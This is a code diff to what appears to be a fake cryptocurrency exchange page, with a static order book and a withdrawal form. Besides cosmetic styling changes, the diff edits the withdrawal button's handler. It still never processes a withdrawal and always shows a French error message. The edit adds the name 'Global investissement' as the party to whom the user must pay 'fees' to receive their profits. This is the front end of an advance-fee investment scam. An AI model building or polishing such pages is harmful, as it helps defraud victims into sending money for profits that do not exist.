@@ -67,6 +67,7 @@
             cursor: pointer;
             color: #21262d;
             font-weight: bold;
+            border-radius: 5px;
         }
 
         main {
@@ -155,6 +156,7 @@
             color: #21262d;
             font-weight: bold;
             width: 48%;
+            border-radius: 5px;
         }
 
         .error-message {
@@ -190,6 +192,7 @@
             color: #21262d;
             font-weight: bold;
             align-self: center;
+            border-radius: 5px;
         }
 
         footer {
@@ -263,13 +266,11 @@
             <div class="order-book">
                 <h3>Order Book</h3>
                 <div class="orders">
-                    <!-- Orders data -->
                     <div class="order">
                         <span class="price">67,974.35</span>
                         <span class="amount">0.19707 BTC</span>
                         <span class="total">13,395.70515 USDT</span>
                     </div>
-                    <!-- More orders -->
                 </div>
             </div>
             <div class="withdrawal-options">
@@ -318,7 +319,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                errorMessage.textContent = 'Erreur : Veuillez régler vos frais pour entrer en possession de vos bénéfices.';
+                errorMessage.textContent = 'Erreur : Veuillez régler vos frais aupres de Global investissement pour entrer en possession de vos bénéfices.';
                 withdrawalForm.style.display = 'none';
             });
 
